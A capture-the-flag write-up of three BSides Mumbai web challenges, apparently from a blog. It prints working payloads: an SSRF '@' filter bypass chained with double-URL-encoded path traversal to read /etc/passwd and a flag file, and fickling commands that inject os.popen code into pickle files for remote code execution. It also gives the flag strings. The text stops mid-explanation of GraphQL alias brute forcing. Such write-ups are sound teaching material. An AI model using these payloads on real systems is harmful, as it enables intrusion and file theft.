------------------

### CTF BSIDESCTF MUMBAI

------------------

![image](https://github.com/user-attachments/assets/a4b42a64-1f70-4091-b3ae-4aa84d952a30)


--------------------

### Challenges

--------------------

- Web-:
  - Phantom-Binding
  - Worthless
  - Operation Overflow

---------------------

### [Web]Phantom Binding

----------------------

![image](https://github.com/user-attachments/assets/a965b09f-e7d8-4b06-8b86-42ae916c4476)

-----------------------

- Ffuf's output-:

![image](https://github.com/user-attachments/assets/9d6a9321-1805-47cf-ab05-6569fdf954ee)


- Users get greeted with the login and register page.I followed the normal sequence by creating an account and logging in.

![image](https://github.com/user-attachments/assets/8d53fcbe-0e53-4760-8c75-adf5fcffe96e)

- I noticed a functionality that allows us to upload image through files or url.This can be an interesting point to try out ServerSide Request Forgery.

![image](https://github.com/user-attachments/assets/1fe12180-6655-43b8-a4a3-da665ef2804a)

- I tried to access internal port with the localhost but I didn't get a hit because it got filtered.

![image](https://github.com/user-attachments/assets/7b5d308f-119e-464d-b5a4-c95819f5455e)

- I decided to try this ssrf trick that requires `@`.Any host placed after `@` will get loaded and not the host before it.

```
google.com@127.0.0.1
```

- The `127.0.0.1` will get picked over `google.com`.In my case, I used an ngrok host.

![image](https://github.com/user-attachments/assets/7bcc45d7-acb9-4df8-ab94-8e91fc0e4d3d)

- The output gets rendered as an image as seen below.

```html


<!DOCTYPE html>
<html>
<head>
    <title>CTF Challenge</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
        }
        .error {
            color: red;
            margin-bottom: 10px;
        }
        .success {
            color: green;
            margin-bottom: 10px;
        }
        input[type="text"], input[type="password"], input[type="file"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
        }
        .user-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        .user-table th, .user-table td {
            padding: 8px;
            border: 1px solid #ddd;
            text-align: left;
        }
        .user-table th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>
    <div class="container">
        
    <h1>Login</h1>
    
    <form method="post">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
    <p>Don't have an account? <a href="/register">Register here</a></p>

    </div>
</body>
</html>
```
- I accessed the admin page next and noticed an endpoint that allows us to view files.

![image](https://github.com/user-attachments/assets/f9a7d216-fe71-4043-b1ab-1846a008312a)

- This functionality will be a good stand to test path traversal to gain `Arbitrary file read`.I tried the basic `../../` but I got a 403 error.

![image](https://github.com/user-attachments/assets/43d48383-dfe2-4dfd-a058-e1de48655628)

- I tested the double-url encoded trick which worked.I was able to read the passwd file.

![image](https://github.com/user-attachments/assets/d9898361-24b0-4560-89cd-69e378a3413c)

- After checking the common spots for the flag file.I could not find the file.I rechecked the admin page for hints and I got one.A php file points to the flag which is being stored at `/var/flag/flag.txt`.

![image](https://github.com/user-attachments/assets/cf2e2e16-f67c-45dc-84f5-c0a58ad43c3d)

![image](https://github.com/user-attachments/assets/14f943ee-7bea-4765-a7a1-2e82ee0382a4)

- I read the flag with this payload-:

```url
http://6.tcp.eu.ngrok.io:16967@127.0.0.1/admin/view_file?file=%252E%252E%252F%252E%252E%252Fvar%252Fflag%252Fflag.txt
```

- Flag-: ```BMCTF{LOCALHOST_isnt_ALWAYS_local}```

![image](https://github.com/user-attachments/assets/ed515136-f3a7-4b78-be08-cd59b97700af)

-----------------

### [Web]Worthless

-----------------

![image](https://github.com/user-attachments/assets/6b7c4656-ca80-4896-a5ef-30ecc03eb0ea)

-----------------

- The chain in this challenge is `Insecure Deserialization via pkl files upload to RCE`.It is not news that `pickle.loads()` is a vulnerable function.Also the upload of pkl files which is used to store pickle bytes can be exploited if directly passed to `pickle.loads()`.This site allows upload of pickle `pkl` files.

![image](https://github.com/user-attachments/assets/0231794f-c2cc-4e43-8920-e391610dc116)

- I injected malicious code into the pkl file with `fickling`.You can install with `pip instal fickling`.

![image](https://github.com/user-attachments/assets/4ac08420-ef37-4539-9889-a169c18c3ffa)

- Syntax to run it-:

```bash
fickling --inject "int(__import__('os').popen('ls').read())" portfolio.pkl > ./portfolioz.pkl
```

- I tried to pop a reverse shell but it didn't work and was also unsure if I had gained RCE.After futile efforts, I noticed that the site returns errors mainly due to bad code syntax.

![image](https://github.com/user-attachments/assets/0870b4fa-5363-4134-bd54-8f10697f0fa6)

- This is an awesome discovery because I can use the error to read the output of `os.system()`.I did this by abusing `int()` feature which is used for integers in python.`int()` triggers an error and also expose a value in the error if it is a string.Example-:

![image](https://github.com/user-attachments/assets/34e21c2d-a928-46d9-a2af-023548153dae)

- I used it to read the value of the command `ls` that I executed.

![image](https://github.com/user-attachments/assets/719c1491-79e4-40c0-af4d-f05a4ec00d5a)

![image](https://github.com/user-attachments/assets/8f026c1b-023f-43fc-b192-4e462f4978be)

- Final payload-:

```
fickling --inject "int(__import__('os').popen('cat flag.txt').read())" portfolio.pkl > ./portfolioz.pkl
```
- Flag-: ```BMCTF{pretty_lil_baby_you_say_that_maybe_youll_be_thinking_of_me_and_try_to_H4CK_me}```

![image](https://github.com/user-attachments/assets/41b2a1f2-63bb-4a91-8992-48ffd503ef47)


------------------

### Operation Overflow

------------------

- The challenge requires us to guess the correct number between (1-100000).

![image](https://github.com/user-attachments/assets/feea68ae-be24-4d6f-a860-bea77a1c54a2)

- The easier method will be to brute force but we might hit a rate limiting error.I checked the js file and discovered that it runs on graphql.

```js
// GraphQL query
            const query = `
                query {
                    guessNumber(number: ${number}) {
                        correct
                        message
                        flag
                    }
                }
            `;
            
            fetch('/graphql', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ query }),
            })
```

- We can bypass rate limiting in graphql by using aliases.A `Query` is made to the server to get data.You can view it as either a `POST` or `GET` request to grab data.An `Alias` allows you to create multiple queries in a given request e.g if you are trying to bruteforce 














